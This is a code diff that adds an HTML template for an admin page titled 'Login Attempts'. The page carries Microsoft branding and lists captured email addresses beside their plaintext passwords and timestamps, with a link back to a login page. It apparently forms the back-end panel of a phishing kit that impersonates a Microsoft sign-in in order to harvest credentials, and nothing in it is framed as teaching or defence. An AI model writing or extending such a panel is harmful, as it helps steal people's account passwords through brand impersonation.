@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin - Login Attempts</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <style>
+        .admin-card { background:#fff; border:1px solid #e0e0e0; border-radius:4px; padding:30px; }
+        table { width:100%; border-collapse:collapse; margin-top:16px; }
+        th { background:#0067b8; color:#fff; padding:10px 14px; text-align:left; font-size:13px; }
+        td { padding:10px 14px; font-size:13px; color:#333; border-bottom:1px solid #eee; }
+        tr:hover td { background:#f5f5f5; }
+        .badge { background:#e8f0fe; color:#0067b8; padding:2px 8px; border-radius:10px; font-size:11px; }
+        .pwd { font-family: monospace; background:#fff3f3; color:#c0392b; padding:2px 8px; border-radius:4px; }
+        h2 { font-size:20px; color:#1b1b1b; margin-bottom:4px; }
+        p.sub { font-size:13px; color:#666; }
+    </style>
+</head>
+<body>
+    <div class="wrapper" style="max-width:750px;">
+        <div class="admin-card">
+
+            <div class="ms-logo">
+                <svg width="21" height="21" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+                    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+                    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+                    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+                </svg>
+                <span>Microsoft</span>
+            </div>
+
+            <h2>Login Attempts</h2>
+            <p class="sub">Total records: <strong>{{ attempts|length }}</strong></p>
+
+            {% if attempts %}
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Email / Username</th>
+                        <th>Password</th>
+                        <th>Timestamp</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for attempt in attempts %}
+                    <tr>
+                        <td><span class="badge">{{ attempt.id }}</span></td>
+                        <td>{{ attempt.email }}</td>
+                        <td><span class="pwd">{{ attempt.password or '—' }}</span></td>
+                        <td>{{ attempt.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <p style="margin-top:20px; color:#888;">No login attempts yet.</p>
+            {% endif %}
+
+            <br>
+            <a href="/" style="color:#0067b8; font-size:13px;">← Back to login</a>
+        </div>
+    </div>
+</body>
+</html>
